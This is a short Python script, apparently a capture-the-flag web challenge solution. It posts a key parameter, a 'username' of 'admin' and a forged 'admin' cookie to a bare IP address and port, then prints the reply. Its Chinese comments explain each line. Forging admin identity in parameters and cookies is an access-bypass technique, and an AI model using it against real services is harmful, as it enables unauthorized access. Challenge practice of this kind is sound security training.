import requests

url = "http://124.70.188.54:32945/?henu=1"  # 替换为实际的目标 URL
payload = {"henu": "First_to_the_key!","username":"admin"}  # 设置要传递的参数
cookies = {"cookies": "admin"}  # 设置 cookies 参数为 "admin"
response = requests.post(url, data=payload,cookies=cookies)

print(response.text)  # 打印响应结果